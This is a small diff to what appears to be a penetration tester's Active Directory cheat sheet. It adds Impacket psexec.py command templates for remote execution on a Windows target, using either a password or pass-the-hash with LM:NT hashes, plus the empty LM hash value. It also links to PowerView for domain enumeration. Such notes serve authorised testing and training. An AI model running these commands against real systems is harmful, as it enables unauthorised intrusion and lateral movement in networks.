@@ -56,6 +56,13 @@ ls \\<computername>\c$
 $host.ui.RawUI.WindowTitle = "<naam>"
 ```
 
+#### Impacket PSexec impacket
+If no LM Hash use an empty one: ```aad3b435b51404eeaad3b435b51404ee```
+```
+python3 psexec.py -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME>@<TARGET>
+python3 psexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>
+```
+
 # Domain Enumeration
 ## Powerview Domain
 https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
